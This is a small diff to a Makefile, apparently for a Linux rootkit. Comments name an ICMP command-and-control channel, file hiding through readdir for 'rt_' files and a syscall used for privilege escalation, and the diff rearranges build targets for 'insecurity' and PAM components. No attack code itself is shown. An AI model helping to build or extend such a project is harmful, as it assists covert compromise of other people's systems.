@@ -9,10 +9,10 @@ kernel: icmp readdir syscall
 # ICMP c2
 # Readdir hiding "rt_" files
 # Syscall for escalation
-icmp readdir syscall pam: 
+icmp readdir syscall insecurity: 
 	$(MAKE) -C $@
 
-insecurity: 
+pam: 
 	sudo apt install -y libpam0g-dev libpam-modules libpam-runtime libpam-dev >/dev/null
 	$(MAKE) -C insecurity
 
